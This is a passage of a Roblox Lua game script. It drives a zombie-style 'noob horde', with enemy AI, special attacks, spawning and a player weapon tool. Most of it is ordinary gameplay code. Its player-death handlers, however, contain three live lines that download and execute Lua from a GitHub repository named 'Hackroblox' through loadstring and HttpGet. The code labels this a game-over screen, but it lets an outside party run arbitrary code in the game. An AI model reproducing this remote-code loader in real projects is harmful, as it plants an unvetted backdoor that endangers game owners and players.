    local message = NOOB_MESSAGES[math.random(1, #NOOB_MESSAGES)]
    local head = noob.model:FindFirstChild("Head")
    
    if head then
        Chat:Chat(head, message, Enum.ChatColor.White)
        noob.lastChat = tick()
    end
end

local function findNearestPlayer(position)
    local nearestPlayer = nil
    local nearestDistance = math.huge
    
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (player.Character.HumanoidRootPart.Position - position).Magnitude
            if distance < nearestDistance then
                nearestDistance = distance
                nearestPlayer = player.Character
            end
        end
    end
    
    return nearestPlayer
end

-- Find allies to heal (for medic)
local function findNearbyAllies(noob)
    local allies = {}
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart then return allies end
    
    for _, otherNoob in ipairs(noobs) do
        if otherNoob ~= noob and otherNoob.model and otherNoob.model.Parent then
            local otherRoot = otherNoob.model:FindFirstChild("HumanoidRootPart") or otherNoob.model:FindFirstChild("Torso")
            if otherRoot then
                local distance = (otherRoot.Position - rootPart.Position).Magnitude
                if distance < 30 and otherNoob.humanoid.Health < otherNoob.humanoid.MaxHealth * 0.7 then
                    table.insert(allies, otherNoob)
                end
            end
        end
    end
    
    return allies
end

-- L4D Special Abilities
local function executeHunterPounce(noob, target)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    local targetRoot = target:FindFirstChild("HumanoidRootPart")
    if not rootPart or not targetRoot then return end
    
    local direction = (targetRoot.Position - rootPart.Position).Unit
    
    local bodyVel = Instance.new("BodyVelocity")
    bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVel.Velocity = direction * 80 + Vector3.new(0, 40, 0)
    bodyVel.Parent = rootPart
    
    game:GetService("Debris"):AddItem(bodyVel, 0.5)
end

local function executeSmokerPull(noob, target)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    local targetRoot = target:FindFirstChild("HumanoidRootPart")
    if not rootPart or not targetRoot then return end
    
    -- Create tongue effect
    local tongue = Instance.new("Part")
    tongue.Size = Vector3.new(0.5, 0.5, (targetRoot.Position - rootPart.Position).Magnitude)
    tongue.CFrame = CFrame.new(rootPart.Position, targetRoot.Position) * CFrame.new(0, 0, -tongue.Size.Z / 2)
    tongue.BrickColor = BrickColor.new("Pink")
    tongue.Material = Enum.Material.Neon
    tongue.Anchored = true
    tongue.CanCollide = false
    tongue.Parent = workspace
    
    -- Pull target
    local bodyPos = Instance.new("BodyPosition")
    bodyPos.MaxForce = Vector3.new(4000, 4000, 4000)
    bodyPos.Position = rootPart.Position
    bodyPos.Parent = targetRoot
    
    wait(2)
    tongue:Destroy()
    bodyPos:Destroy()
end

local function executeBoomerExplosion(noob)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart then return end
    
    -- Create explosion effect
    local explosion = Instance.new("Part")
    explosion.Size = Vector3.new(1, 1, 1)
    explosion.Position = rootPart.Position
    explosion.Anchored = true
    explosion.CanCollide = false
    explosion.BrickColor = BrickColor.new("Lime green")
    explosion.Material = Enum.Material.Neon
    explosion.Shape = Enum.PartType.Ball
    explosion.Parent = workspace
    
    for i = 1, 10 do
        explosion.Size = explosion.Size + Vector3.new(2, 2, 2)
        explosion.Transparency = i / 10
        wait(0.05)
    end
    explosion:Destroy()
    
    -- Damage nearby players
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (player.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
            if distance < 20 then
                local humanoid = player.Character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid:TakeDamage(30)
                end
            end
        end
    end
    
    noob.humanoid.Health = 0
end

local function executeChargerCharge(noob, target)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    local targetRoot = target:FindFirstChild("HumanoidRootPart")
    if not rootPart or not targetRoot then return end
    
    noob.humanoid.WalkSpeed = noob.variant.speed * 2
    
    local direction = (targetRoot.Position - rootPart.Position).Unit
    local bodyVel = Instance.new("BodyVelocity")
    bodyVel.MaxForce = Vector3.new(math.huge, 0, math.huge)
    bodyVel.Velocity = direction * 60
    bodyVel.Parent = rootPart
    
    wait(2)
    noob.humanoid.WalkSpeed = noob.variant.speed
    if bodyVel and bodyVel.Parent then
        bodyVel:Destroy()
    end
end

local function executeSpitterAcid(noob, targetPos)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart then return end
    
    -- Create acid puddle
    local acid = Instance.new("Part")
    acid.Size = Vector3.new(10, 0.5, 10)
    acid.Position = targetPos
    acid.Anchored = true
    acid.CanCollide = false
    acid.BrickColor = BrickColor.new("Lime green")
    acid.Material = Enum.Material.Neon
    acid.Transparency = 0.5
    acid.Parent = workspace
    
    -- Damage over time
    spawn(function()
        for i = 1, 50 do
            for _, player in ipairs(Players:GetPlayers()) do
                if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
                    local distance = (player.Character.HumanoidRootPart.Position - acid.Position).Magnitude
                    if distance < 10 then
                        local humanoid = player.Character:FindFirstChild("Humanoid")
                        if humanoid then
                            humanoid:TakeDamage(2)
                        end
                    end
                end
            end
            wait(0.2)
        end
        acid:Destroy()
    end)
end

local function executeKamikazeExplosion(noob)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart then return end
    
    local head = noob.model:FindFirstChild("Head")
    
    -- Scream before exploding
    if head then
        Chat:Chat(head, "LEEDO LELELEL DOOO", Enum.ChatColor.Red)
    end
    
    wait(0.5)
    
    -- Create massive explosion effect
    local explosion = Instance.new("Part")
    explosion.Size = Vector3.new(1, 1, 1)
    explosion.Position = rootPart.Position
    explosion.Anchored = true
    explosion.CanCollide = false
    explosion.BrickColor = BrickColor.new("Bright red")
    explosion.Material = Enum.Material.Neon
    explosion.Shape = Enum.PartType.Ball
    explosion.Parent = workspace
    
    -- Create actual explosion
    local explosionObject = Instance.new("Explosion")
    explosionObject.Position = rootPart.Position
    explosionObject.BlastRadius = 25
    explosionObject.BlastPressure = 500000
    explosionObject.Parent = workspace
    
    for i = 1, 15 do
        explosion.Size = explosion.Size + Vector3.new(3, 3, 3)
        explosion.Transparency = i / 15
        wait(0.03)
    end
    explosion:Destroy()
    
    -- Damage nearby players massively
    for _, player in ipairs(Players:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local distance = (player.Character.HumanoidRootPart.Position - rootPart.Position).Magnitude
            if distance < 25 then
                local humanoid = player.Character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid:TakeDamage(noob.variant.damage)
                end
            end
        end
    end
    
    noob.humanoid.Health = 0
end

local function executeEvilSmack(noob, target)
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    local targetRoot = target:FindFirstChild("HumanoidRootPart")
    if not rootPart or not targetRoot then return end
    
    local head = noob.model:FindFirstChild("Head")
    if head then
        Chat:Chat(head, "PREPARE TO BE SMACKED INTO OBLIVION!", Enum.ChatColor.Red)
    end
    
    wait(0.3)
    
    -- Create smack effect
    local smackEffect = Instance.new("Part")
    smackEffect.Size = Vector3.new(8, 8, 8)
    smackEffect.Position = targetRoot.Position
    smackEffect.Anchored = true
    smackEffect.CanCollide = false
    smackEffect.BrickColor = BrickColor.new("Really red")
    smackEffect.Material = Enum.Material.Neon
    smackEffect.Shape = Enum.PartType.Ball
    smackEffect.Transparency = 0.5
    smackEffect.Parent = workspace
    
    -- Smack sound effect
    local sound = Instance.new("Sound")
    sound.SoundId = "rbxassetid://165969964"
    sound.Volume = 1
    sound.Parent = smackEffect
    sound:Play()
    
    -- Launch player into oblivion with massive force
    local direction = (targetRoot.Position - rootPart.Position).Unit
    local upwardBias = Vector3.new(direction.X, 1, direction.Z).Unit
    
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
    bodyVelocity.Velocity = upwardBias * 200 + Vector3.new(0, 150, 0)
    bodyVelocity.Parent = targetRoot
    
    -- Damage player
    local targetHumanoid = target:FindFirstChildOfClass("Humanoid")
    if targetHumanoid then
        targetHumanoid:TakeDamage(noob.variant.damage * 0.5)
    end
    
    -- Clean up effect
    for i = 1, 10 do
        smackEffect.Size = smackEffect.Size + Vector3.new(2, 2, 2)
        smackEffect.Transparency = 0.5 + (i / 10) * 0.5
        wait(0.05)
    end
    
    smackEffect:Destroy()
    game:GetService("Debris"):AddItem(bodyVelocity, 1)
end

local function updateNoobAI(noob)
    if not noob.model or not noob.model.Parent or noob.humanoid.Health <= 0 then
        return false
    end
    
    local rootPart = noob.model:FindFirstChild("HumanoidRootPart") or noob.model:FindFirstChild("Torso")
    if not rootPart then return false end
    
    -- Try to find weapon if doesn't have one
    if not noob.weapon and tick() - noob.lastWeaponSearch > 10 then
        noob.lastWeaponSearch = tick()
        if math.random(1, 3) == 1 then -- 33% chance to look for weapon
            local weapon = findNearbyWeapon(rootPart.Position)
            if weapon then
                weapon.Parent = noob.model
                noob.humanoid:EquipTool(weapon)
                noob.weapon = weapon
            elseif giveWeaponToNoob(noob) then
                -- Successfully got weapon from storage
            end
        end
    end
    
    -- Update pathfinding periodically
    if tick() - noob.lastPathUpdate > CONFIG.PATH_UPDATE_INTERVAL then
        noob.lastPathUpdate = tick()
        noob.pathIndex = 1
        noob.waypoints = nil -- Clear old path
    end
    
    -- Kamikaze behavior - rush to player and explode
    if noob.variant.aiType == "kamikaze" then
        if not noob.target or not noob.target.Parent then
            noob.target = findNearestPlayer(rootPart.Position)
        end
        
        if noob.target then
            local targetRoot = noob.target:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local distance = (targetRoot.Position - rootPart.Position).Magnitude
                
                -- Scream periodically while rushing
                if math.random(1, 50) == 1 then
                    local head = noob.model:FindFirstChild("Head")
                    if head then
                        Chat:Chat(head, "LEEDO LELELEL DOOO", Enum.ChatColor.Red)
                    end
                end
                
                if distance < 8 then
                    -- Close enough - EXPLODE!
                    executeKamikazeExplosion(noob)
                    return false
                else
                    -- Rush towards player at high speed
                    noob.humanoid.WalkSpeed = noob.variant.speed * 1.2
                    
                    if tick() - noob.lastPathUpdate >= CONFIG.PATH_UPDATE_INTERVAL then
                        local waypoints = createPath(rootPart.Position, targetRoot.Position)
                        if waypoints then
                            noob.waypoints = waypoints
                            noob.pathIndex = 1
                        else
                            noob.humanoid:MoveTo(targetRoot.Position)
                        end
                    end
                    
                    if noob.waypoints then
                        followPath(noob, noob.waypoints)
                    else
                        noob.humanoid:MoveTo(targetRoot.Position)
                    end
                end
            end
        end
        
        return true
    end
    
    -- AI Type behaviors
    if noob.variant.aiType == "support" then
        -- Medic behavior - heal allies
        if tick() - noob.lastSpecialAction > 5 then
            local allies = findNearbyAllies(noob)
            if #allies > 0 then
                local target = allies[math.random(1, #allies)]
                local targetRoot = target.model:FindFirstChild("HumanoidRootPart") or target.model:FindFirstChild("Torso")
                if targetRoot then
                    local distance = (targetRoot.Position - rootPart.Position).Magnitude
                    if distance < 10 then
                        -- Heal ally
                        target.humanoid.Health = math.min(target.humanoid.Health + 20, target.humanoid.MaxHealth)
                        
                        -- Healing effect
                        local healEffect = Instance.new("Part")
                        healEffect.Size = Vector3.new(2, 2, 2)
                        healEffect.Position = targetRoot.Position
                        healEffect.Anchored = true
                        healEffect.CanCollide = false
                        healEffect.BrickColor = BrickColor.new("Lime green")
                        healEffect.Material = Enum.Material.Neon
                        healEffect.Shape = Enum.PartType.Ball
                        healEffect.Transparency = 0.5
                        healEffect.Parent = workspace
                        game:GetService("Debris"):AddItem(healEffect, 1)
                        
                        noob.lastSpecialAction = tick()
                    else
                        -- Path to ally
                        noob.humanoid:MoveTo(targetRoot.Position)
                    end
                end
            end
        end
        
        -- Avoid players
        local nearestPlayer = findNearestPlayer(rootPart.Position)
        if nearestPlayer then
            local targetRoot = nearestPlayer:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local distance = (targetRoot.Position - rootPart.Position).Magnitude
                if distance < 20 then
                    local awayDirection = (rootPart.Position - targetRoot.Position).Unit
                    noob.humanoid:MoveTo(rootPart.Position + awayDirection * 30)
                end
            end
        end
    elseif noob.variant.aiType == "passive_aggressive" then
        -- Witch behavior - idle until provoked
        if not noob.isEnraged then
            -- Stand still and cry
            if math.random(1, 200) == 1 then
                makeNoobChat(noob)
            end
            
            -- Check if attacked
            if noob.humanoid.Health < noob.humanoid.MaxHealth then
                noob.isEnraged = true
                noob.humanoid.WalkSpeed = noob.variant.speed
            end
        else
            -- Attack nearest player aggressively
            if not noob.target or not noob.target.Parent then
                noob.target = findNearestPlayer(rootPart.Position)
            end
            
            if noob.target then
                local targetRoot = noob.target:FindFirstChild("HumanoidRootPart")
                if targetRoot then
                    local distance = (targetRoot.Position - rootPart.Position).Magnitude
                    
                    if distance > 5 then
                        if tick() - noob.lastPathUpdate >= CONFIG.PATH_UPDATE_INTERVAL then
                            local waypoints = createPath(rootPart.Position, targetRoot.Position)
                            if waypoints then
                                noob.waypoints = waypoints
                                noob.pathIndex = 0
                            else
                                noob.humanoid:MoveTo(targetRoot.Position)
                            end
                        end
                        
                        if noob.waypoints then
                            followPath(noob, noob.waypoints)
                        end
                    else
                        local targetHumanoid = noob.target:FindFirstChildOfClass("Humanoid")
                        if targetHumanoid then
                            targetHumanoid:TakeDamage(noob.variant.damage * 0.2)
                        end
                    end
                end
            end
        end
    else
        -- Find target using vision and hearing
        if not noob.target or not noob.target.Parent then
            local nearestPlayer = findNearestPlayer(rootPart.Position)
            
            if nearestPlayer then
                -- Always track nearby players, vision/hearing just affects alertness
                local distance = (nearestPlayer:FindFirstChild("HumanoidRootPart").Position - rootPart.Position).Magnitude
                
                if distance < 100 or canSeeTarget(noob, nearestPlayer) or canHearTarget(noob, nearestPlayer) then
                    noob.target = nearestPlayer
                    noob.alertLevel = 100
                end
            end
        end
        
        -- Decay alert level
        noob.alertLevel = math.max(0, noob.alertLevel - 1)
        
        if noob.target then
            local targetRoot = noob.target:FindFirstChild("HumanoidRootPart")
            if targetRoot then
                local distance = (targetRoot.Position - rootPart.Position).Magnitude
                
                -- Update visibility - keep tracking if close enough even without sight
                if distance > 100 and not canSeeTarget(noob, noob.target) and not canHearTarget(noob, noob.target) then
                    if noob.alertLevel <= 0 then
                        noob.target = nil
                    end
                else
                    noob.alertLevel = 100
                end
                
                if distance > 5 then
                    -- Use pathfinding
                    if tick() - noob.lastPathUpdate >= CONFIG.PATH_UPDATE_INTERVAL then
                        local waypoints = createPath(rootPart.Position, targetRoot.Position)
                        if waypoints then
                            noob.waypoints = waypoints
                            noob.pathIndex = 1
                        else
                            -- Pathfinding failed, use direct movement
                            noob.waypoints = nil
                        end
                    end
                    
                    if noob.waypoints then
                        followPath(noob, noob.waypoints)
                    else
                        -- Direct movement fallback
                        noob.humanoid:MoveTo(targetRoot.Position)
                    end
                    
                    -- Special movement abilities
                    if noob.variant.special == "flying" or noob.variant.special == "hunter" then
                        local bodyVel = rootPart:FindFirstChildOfClass("BodyVelocity")
                        if bodyVel then
                            bodyVel.Velocity = Vector3.new(0, 10, 0)
                        end
                    end
                else
                    -- Attack
                    local targetHumanoid = noob.target:FindFirstChildOfClass("Humanoid")
                    if targetHumanoid then
                        -- Use weapon if available
                        if noob.weapon and noob.weapon.Parent then
                            local stats = noob.weapon:FindFirstChild("Stats")
                            local damage = stats and stats:FindFirstChild("Damage") and stats.Damage.Value or noob.variant.damage
                            local range = stats and stats:FindFirstChild("Range") and stats.Range.Value or 5
                            
                            if distance < range then
                                -- Weapon attack
                                targetHumanoid:TakeDamage(damage * 0.1)
                                
                                -- Create weapon effect
                                if noob.weapon:FindFirstChild("Handle") then
                                    local effect = Instance.new("Part")
                                    effect.Size = Vector3.new(0.5, 0.5, 1)
                                    effect.CFrame = noob.weapon.Handle.CFrame
                                    effect.BrickColor = BrickColor.new("Bright yellow")
                                    effect.Material = Enum.Material.Neon
                                    effect.Anchored = true
                                    effect.CanCollide = false
                                    effect.Parent = workspace
                                    game:GetService("Debris"):AddItem(effect, 0.1)
                                end
                            end
                        else
                            -- Melee attack
                            targetHumanoid:TakeDamage(noob.variant.damage * 0.1)
                        end
                    end
                end
                
                -- Special abilities based on variant
                if noob.variant.special and tick() - noob.lastSpecialAction > 5 then
                    if noob.variant.special == "hunter" and distance > 15 and distance < 40 then
                        executeHunterPounce(noob, noob.target)
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "smoker" and distance < 50 then
                        spawn(function() executeSmokerPull(noob, noob.target) end)
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "boomer" and distance < 8 then
                        executeBoomerExplosion(noob)
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "charger" and distance > 10 and distance < 30 then
                        spawn(function() executeChargerCharge(noob, noob.target) end)
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "spitter" and distance < 30 then
                        executeSpitterAcid(noob, targetRoot.Position)
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "tank" then
                        -- Tank throws rocks
                        local rock = Instance.new("Part")
                        rock.Size = Vector3.new(3, 3, 3)
                        rock.Position = rootPart.Position + Vector3.new(0, 5, 0)
                        rock.BrickColor = BrickColor.new("Dark stone grey")
                        rock.Shape = Enum.PartType.Ball
                        rock.Parent = workspace
                        
                        local bodyVel = Instance.new("BodyVelocity")
                        bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        bodyVel.Velocity = (targetRoot.Position - rock.Position).Unit * 70 + Vector3.new(0, 20, 0)
                        bodyVel.Parent = rock
                        
                        rock.Touched:Connect(function(hit)
                            if hit.Parent:FindFirstChild("Humanoid") then
                                hit.Parent.Humanoid:TakeDamage(40)
                                rock:Destroy()
                            end
                        end)
                        
                        game:GetService("Debris"):AddItem(rock, 5)
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "evil" and distance < 15 then
                        -- Evil Noob smacks player into oblivion
                        spawn(function() executeEvilSmack(noob, noob.target) end)
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "oppenheimer" and distance < 80 and distance > 20 then
                        -- Oppenheimer Noob calls orbital strike
                        local tool = noob.model:FindFirstChild("Orbital Strike")
                        if tool and tool:IsA("Tool") then
                            -- Activate the tool
                            tool:Activate()
                            noob.lastSpecialAction = tick()
                        end
                    elseif noob.variant.special == "thrower" then
                        -- Find any throwable object in workspace
                        local throwables = {}
                        for _, obj in ipairs(workspace:GetDescendants()) do
                            if obj:IsA("BasePart") and not obj:IsA("Terrain") and not obj.Anchored 
                               and obj.Size.Magnitude < 10 and (obj.Position - rootPart.Position).Magnitude < 30 then
                                table.insert(throwables, obj)
                            end
                        end
                        
                        if #throwables > 0 then
                            local throwable = throwables[math.random(1, #throwables)]
                            local clone = throwable:Clone()
                            clone.Position = rootPart.Position + Vector3.new(0, 5, 0)
                            clone.Anchored = false
                            
                            local bodyVel = Instance.new("BodyVelocity")
                            bodyVel.MaxForce = Vector3.new(4000, 4000, 4000)
                            bodyVel.Velocity = (targetRoot.Position - clone.Position).Unit * 50
                            bodyVel.Parent = clone
                            
                            game:GetService("Debris"):AddItem(bodyVel, 0.5)
                            clone.Parent = workspace
                            
                            clone.Touched:Connect(function(hit)
                                if hit.Parent:FindFirstChild("Humanoid") then
                                    hit.Parent.Humanoid:TakeDamage(noob.variant.damage)
                                    clone:Destroy()
                                end
                            end)
                            
                            game:GetService("Debris"):AddItem(clone, 5)
                            noob.lastSpecialAction = tick()
                        end
                    elseif noob.variant.special == "flamethrower" and distance < 20 then
                        for i = 1, 3 do
                            local fire = Instance.new("Part")
                            fire.Size = Vector3.new(1, 1, 1)
                            fire.Position = rootPart.Position + Vector3.new(0, 2, 0)
                            fire.Anchored = false
                            fire.CanCollide = false
                            fire.BrickColor = BrickColor.new("Bright red")
                            fire.Material = Enum.Material.Neon
                            fire.Shape = Enum.PartType.Ball
                            
                            local bodyVel = Instance.new("BodyVelocity")
                            bodyVel.MaxForce = Vector3.new(4000, 4000, 4000)
                            bodyVel.Velocity = (targetRoot.Position - fire.Position).Unit * 30
                            bodyVel.Parent = fire
                            
                            fire.Parent = workspace
                            
                            fire.Touched:Connect(function(hit)
                                if hit.Parent:FindFirstChild("Humanoid") then
                                    hit.Parent.Humanoid:TakeDamage(noob.variant.damage * 0.5)
                                end
                            end)
                            
                            game:GetService("Debris"):AddItem(fire, 2)
                        end
                        noob.lastSpecialAction = tick()
                    elseif noob.variant.special == "driver" then
                        -- Find any vehicle seat in workspace
                        for _, obj in ipairs(workspace:GetDescendants()) do
                            if obj:IsA("VehicleSeat") and (obj.Position - rootPart.Position).Magnitude < 20 then
                                obj:Sit(noob.humanoid)
                                noob.lastSpecialAction = tick()
                                break
                            end
                        end
                    end
                end
            end
        else
            -- Idle/patrol behavior
            if math.random(1, 200) == 1 then
                local randomPos = rootPart.Position + Vector3.new(
                    math.random(-30, 30),
                    0,
                    math.random(-30, 30)
                )
                noob.humanoid:MoveTo(randomPos)
            end
        end
    end
    
    -- Random chatting
    if math.random(1, 100) > 95 then
        makeNoobChat(noob)
    end
    
    return true
end

local function spawnNoob()
    -- Always try to maintain noob population
    if #noobs >= CONFIG.MAX_NOOBS then
        return
    end
    
    if #spawnLocations == 0 then
        return
    end
    
    -- Check spawn timer
    if tick() - lastSpawnTime < CONFIG.SPAWN_INTERVAL then
        return
    end
    
    lastSpawnTime = tick()
    
    -- Choose random spawn location
    local spawnPos = spawnLocations[math.random(1, #spawnLocations)]
    
    -- Add some randomness to spawn position
    spawnPos = spawnPos + Vector3.new(
        math.random(-10, 10),
        0,
        math.random(-10, 10)
    )
    
    local variant = chooseVariant()
    local noob = createNoob(spawnPos, variant)
    
    if noob then
        table.insert(noobs, noob)
        print("Spawned: " .. variant.name .. " (Total: " .. #noobs .. ")")
    end
end

local function mainLoop()
    while true do
        -- Update all noobs
        for i = #noobs, 1, -1 do
            pcall(function()
                if not updateNoobAI(noobs[i]) then
                    if noobs[i] and noobs[i].model then
                        noobs[i].model:Destroy()
                    end
                    table.remove(noobs, i)
                end
            end)
        end
        
        -- Always try to spawn new noobs to replace dead ones
        if #noobs < CONFIG.MAX_NOOBS then
            spawnNoob()
        end
        
        wait(0.1) -- Fast update for responsive AI
    end
end

local function giveWeapons(player)
    wait(1)
    
    if not player.Character then return end
    
    local tool = Instance.new("Tool")
    tool.Name = "Noob Blaster"
    tool.RequiresHandle = true
    
    local handle = Instance.new("Part")
    handle.Name = "Handle"
    handle.Size = Vector3.new(0.5, 1, 2)
    handle.BrickColor = BrickColor.new("Dark stone grey")
    handle.Parent = tool
    
    tool.Activated:Connect(function()
        local character = player.Character
        if not character then return end
        
        local humanoidRootPart = character:FindFirstChild("HumanoidRootPart")
        if not humanoidRootPart then return end
        
        local projectile = Instance.new("Part")
        projectile.Size = Vector3.new(0.5, 0.5, 2)
        projectile.BrickColor = BrickColor.new("Bright yellow")
        projectile.Material = Enum.Material.Neon
        projectile.CanCollide = false
        projectile.CFrame = handle.CFrame
        projectile.Parent = workspace
        
        local bodyVel = Instance.new("BodyVelocity")
        bodyVel.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
        bodyVel.Velocity = humanoidRootPart.CFrame.LookVector * 100
        bodyVel.Parent = projectile
        
        projectile.Touched:Connect(function(hit)
            local humanoid = hit.Parent:FindFirstChildOfClass("Humanoid")
            if humanoid and hit.Parent ~= character then
                humanoid:TakeDamage(50)
                projectile:Destroy()
            end
        end)
        
        game:GetService("Debris"):AddItem(projectile, 3)
    end)
    
    tool.Parent = player.Backpack
end

Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        giveWeapons(player)
        
        -- Watch for player death
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            -- Trigger game over effect
            wait(0.5)
            local playerGui = player:WaitForChild("PlayerGui")
            
            -- Load and execute the wasted script
            local success, err = pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/trantung120213123/Hackroblox/refs/heads/main/wasted.lua"))()
            end)
            
            if not success then
                warn("Failed to load gameover script:", err)
                
                -- Fallback gameover screen
                local screenGui = Instance.new("ScreenGui")
                screenGui.Name = "GameOverGui"
                screenGui.ResetOnSpawn = false
                screenGui.Parent = playerGui
                
                local frame = Instance.new("Frame")
                frame.Size = UDim2.new(1, 0, 1, 0)
                frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
                frame.BackgroundTransparency = 0.3
                frame.Parent = screenGui
                
                local textLabel = Instance.new("TextLabel")
                textLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
                textLabel.Position = UDim2.new(0.1, 0, 0.4, 0)
                textLabel.BackgroundTransparency = 1
                textLabel.Text = "WASTED"
                textLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
                textLabel.TextScaled = true
                textLabel.Font = Enum.Font.SourceSansBold
                textLabel.Parent = frame
                
                -- Fade in effect
                frame.BackgroundTransparency = 1
                textLabel.TextTransparency = 1
                
                for i = 1, 20 do
                    frame.BackgroundTransparency = 1 - (i / 20) * 0.7
                    textLabel.TextTransparency = 1 - (i / 20)
                    wait(0.05)
                end
            end
        end)
    end)
end)

print("=== NOOB SURVIVAL STARTING ===")
scanEnvironment()
createBasicWeapons()
loadModels()

for _, player in ipairs(Players:GetPlayers()) do
    if player.Character then
        giveWeapons(player)
        
        -- Add death watcher
        local humanoid = player.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.Died:Connect(function()
                wait(0.5)
                local playerGui = player:WaitForChild("PlayerGui")
                
                local success, err = pcall(function()
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/trantung120213123/Hackroblox/refs/heads/main/wasted.lua"))()
                end)
                
                if not success then
                    warn("Failed to load gameover script:", err)
                end
            end)
        end
    end
    player.CharacterAdded:Connect(function(character)
        giveWeapons(player)
        
        local humanoid = character:WaitForChild("Humanoid")
        humanoid.Died:Connect(function()
            wait(0.5)
            local playerGui = player:WaitForChild("PlayerGui")
            
            local success, err = pcall(function()
                loadstring(game:HttpGet("https://raw.githubusercontent.com/trantung120213123/Hackroblox/refs/heads/main/wasted.lua"))()
            end)
            
            if not success then
                warn("Failed to load gameover script:", err)
            end
        end)
    end)
end

print("Workspace scanned! Starting noob spawning...")
print("Fight to survive against the noob horde!")
print("Noobs will use weapons found in Lighting and ReplicatedStorage!")

-- Play intro sound
if introSound then
    print("Playing intro sound...")
    introSound:Play()
    wait(introSound.TimeLength > 0 and introSound.TimeLength or 3) -- Wait for intro to finish
end

print("LET THE SURVIVAL BEGIN!")

spawn(mainLoop)
